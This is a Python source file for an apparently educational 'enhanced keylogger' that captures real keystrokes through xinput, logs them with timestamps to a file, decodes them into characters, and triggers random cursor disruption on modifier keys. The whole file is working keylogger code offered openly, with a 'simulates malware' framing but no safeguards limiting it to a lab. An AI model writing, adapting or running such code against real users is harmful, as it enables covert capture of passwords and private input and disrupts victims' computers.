#!/usr/bin/env python3
"""
Enhanced Keylogger with Cursor Disruption Module
Combines traditional keylogging with cursor disruption to simulate advanced malware behavior.
"""

import sys
import time
import threading
from datetime import datetime
import os

# Import our cursor disruption module
from cursor_disruption import CursorDisruptionModule

class EnhancedKeylogger:
    """
    Enhanced keylogger that combines traditional keylogging with cursor disruption.
    Simulates advanced malware behavior during data exfiltration.
    """
    
    def __init__(self, log_file="enhanced_keylog.txt"):
        self.log_file = log_file
        self.running = False
        self.keylog_thread = None
        
        # Initialize cursor disruption module
        self.cursor_disruption = CursorDisruptionModule("enhanced_disruption.log")
        
        # Key mapping (from original parser.py)
        self.keymap = {
            59: ",", 60: ".", 61: "/", 47: ";", 48: "'", 34: "[", 35: "]", 51: "\\", 
            20: "-", 21: "=", 23: "", 64: "", 10: '1', 11: '2', 12: '3', 13: '4', 
            14: '5', 15: '6', 16: '7', 17: '8', 18: '9', 19: '0', 65: " ", 
            105: '[RCTRL]', 37: '[LCTRL]', 36: '[RETURN]', 38: 'a', 56: 'b', 54: 'c', 
            40: 'd', 26: 'e', 41: 'f', 42: 'g', 43: 'h', 31: 'i', 44: 'j', 45: 'k', 
            46: 'l', 58: 'm', 57: 'n', 32: 'o', 33: 'p', 24: 'q', 27: 'r', 39: 's', 
            28: 't', 30: 'u', 55: 'v', 25: 'w', 53: 'x', 29: 'y', 52: 'z'
        }
        
        self.symbols = {
            10: '!', 11: '@', 12: '#', 13: '$', 14: '%', 15: '^', 16: '&', 17: '*', 
            18: '(', 19: ')', 59: "<", 60: ">", 61: "?", 47: ":", 48: "\"", 34: "{", 
            35: "}", 51: "|", 20: "_", 21: "+"
        }
        
        # Configuration
        self.config = {
            'enable_cursor_disruption': True,
            'disruption_intensity': 'medium',  # low, medium, high
            'log_timestamps': True,
            'trigger_disruption_on_special_keys': True
        }
        
    def setup_disruption_intensity(self):
        """Configure cursor disruption based on intensity level."""
        intensity_configs = {
            'low': {
                'disruption_interval': (10, 30),
                'trigger_probability': 0.1,
                'movement_range': (20, 100)
            },
            'medium': {
                'disruption_interval': (5, 15),
                'trigger_probability': 0.3,
                'movement_range': (50, 200)
            },
            'high': {
                'disruption_interval': (2, 8),
                'trigger_probability': 0.6,
                'movement_range': (100, 400)
            }
        }
        
        config = intensity_configs.get(self.config['disruption_intensity'], intensity_configs['medium'])
        self.cursor_disruption.set_config(**config)
        
    def log_key_event(self, event_type, key_code, timestamp=None):
        """Log a key event with optional timestamp."""
        if timestamp is None:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            
        log_entry = f"{timestamp} {event_type} {key_code}\n"
        
        try:
            with open(self.log_file, 'a') as f:
                f.write(log_entry)
        except Exception as e:
            print(f"Error logging key event: {e}")
            
    def trigger_disruption_on_key(self, key_code):
        """Trigger cursor disruption based on specific keys."""
        if not self.config['trigger_disruption_on_special_keys']:
            return
            
        # Trigger disruption on special keys
        special_keys = [37, 105, 66, 50, 62]  # Ctrl, Shift, Alt keys
        if key_code in special_keys:
            self.cursor_disruption.keyboard_trigger(f"key_{key_code}")
            
    def parse_key_event(self, line):
        """Parse a key event line and extract information."""
        try:
            parts = line.strip().split()
            if len(parts) >= 3:
                timestamp = parts[0]
                event_type = parts[1]
                key_code = int(parts[2])
                return timestamp, event_type, key_code
        except (ValueError, IndexError):
            pass
        return None, None, None
        
    def keylog_loop(self):
        """Main keylogging loop that reads from xinput output."""
        print("🔍 Enhanced keylogging started...")
        print("📝 Logging to:", self.log_file)
        
        try:
            # Use xinput to capture keyboard events
            import subprocess
            
            # Get keyboard device ID (you can modify this to auto-detect)
            keyboard_id = input("Enter keyboard device ID (or press Enter for default): ").strip()
            if not keyboard_id:
                keyboard_id = "0"  # Default keyboard
                
            print(f"🎹 Monitoring keyboard device: {keyboard_id}")
            
            # Start xinput test process
            process = subprocess.Popen(
                ['xinput', '--test', keyboard_id],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            while self.running:
                line = process.stdout.readline()
                if not line:
                    break
                    
                timestamp, event_type, key_code = self.parse_key_event(line)
                if timestamp and event_type and key_code is not None:
                    # Log the key event
                    self.log_key_event(event_type, key_code, timestamp)
                    
                    # Trigger disruption on key press
                    if event_type == "press":
                        self.trigger_disruption_on_key(key_code)
                        
                    # Print decoded key (for demonstration)
                    if event_type == "press" and key_code in self.keymap:
                        key_char = self.keymap[key_code]
                        print(f"⌨️  Key pressed: {key_char} (code: {key_code})")
                        
            process.terminate()
            
        except Exception as e:
            print(f"❌ Keylogging error: {e}")
            
    def start_keylogging(self):
        """Start the enhanced keylogger with cursor disruption."""
        if self.running:
            print("⚠️  Keylogger already running")
            return
            
        self.running = True
        
        # Setup cursor disruption
        if self.config['enable_cursor_disruption']:
            self.setup_disruption_intensity()
            self.cursor_disruption.start_disruption()
            print("🔧 Cursor disruption module activated")
            
        # Start keylogging thread
        self.keylog_thread = threading.Thread(target=self.keylog_loop, daemon=True)
        self.keylog_thread.start()
        
        print("🚀 Enhanced keylogger started successfully!")
        print("📊 Features:")
        print("   - Traditional keylogging")
        print("   - Cursor disruption simulation")
        print("   - Timestamp logging")
        print("   - Special key triggers")
        
    def stop_keylogging(self):
        """Stop the enhanced keylogger."""
        if not self.running:
            return
            
        self.running = False
        
        # Stop cursor disruption
        if self.config['enable_cursor_disruption']:
            self.cursor_disruption.stop_disruption()
            
        print("🛑 Enhanced keylogger stopped")
        
    def get_status(self):
        """Get current status of the enhanced keylogger."""
        return {
            'running': self.running,
            'log_file': self.log_file,
            'config': self.config.copy(),
            'cursor_disruption_status': self.cursor_disruption.get_status()
        }
        
    def set_config(self, **kwargs):
        """Update configuration parameters."""
        self.config.update(kwargs)
        if 'disruption_intensity' in kwargs:
            self.setup_disruption_intensity()
        print(f"⚙️  Configuration updated: {kwargs}")


def main():
    """Main function to run the enhanced keylogger."""
    print("🔧 Enhanced Keylogger with Cursor Disruption")
    print("=" * 50)
    print("This tool simulates advanced malware behavior by combining")
    print("traditional keylogging with cursor disruption tactics.")
    print()
    
    # Create enhanced keylogger
    keylogger = EnhancedKeylogger()
    
    # Configuration options
    print("Configuration options:")
    print("1. Low disruption intensity (subtle)")
    print("2. Medium disruption intensity (balanced)")
    print("3. High disruption intensity (aggressive)")
    
    choice = input("Select intensity level (1-3, default=2): ").strip()
    if choice == "1":
        keylogger.set_config(disruption_intensity='low')
    elif choice == "3":
        keylogger.set_config(disruption_intensity='high')
    else:
        keylogger.set_config(disruption_intensity='medium')
        
    print()
    print("Starting enhanced keylogger...")
    print("Press Ctrl+C to stop")
    print()
    
    try:
        # Start keylogging
        keylogger.start_keylogging()
        
        # Keep running
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n🛑 Stopping enhanced keylogger...")
        keylogger.stop_keylogging()
        
        # Show final status
        status = keylogger.get_status()
        print(f"📊 Final status:")
        print(f"   - Log file: {status['log_file']}")
        print(f"   - Cursor disruption: {'Active' if status['cursor_disruption_status']['running'] else 'Inactive'}")
        print("✅ Enhanced keylogger stopped successfully!")


if __name__ == "__main__":
    main() 